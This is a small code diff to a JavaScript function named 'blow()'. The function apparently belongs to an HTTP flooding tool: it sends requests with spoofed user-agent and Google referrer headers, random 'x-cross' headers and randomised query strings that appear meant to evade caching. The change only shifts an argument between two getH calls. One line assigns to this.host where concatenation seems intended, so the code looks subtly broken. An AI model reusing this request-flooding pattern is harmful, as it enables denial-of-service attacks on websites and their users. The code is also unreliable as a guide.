@@ -21,7 +21,7 @@ blow() {
   var headers = {
   'user-agent':getUserAgent(),
   'Content-Type':'application/x-www-form-urlencoded',
-  'referrer':'https://www.google.com/q='+getH(1),
+  'referrer':'https://www.google.com/q='+getH(),
   'x-cross-1':getH(),
   'x-cross-2':getH(),
   'x-cross-3':getH(),
@@ -29,7 +29,7 @@ blow() {
   'x-cross-5':getH()
   }
       var options = {
-        url:this.host='?q='+getH(),
+        url:this.host='?q='+getH(1),
         headers:headers
       }
       Req.get(options,function (err, response, body) {
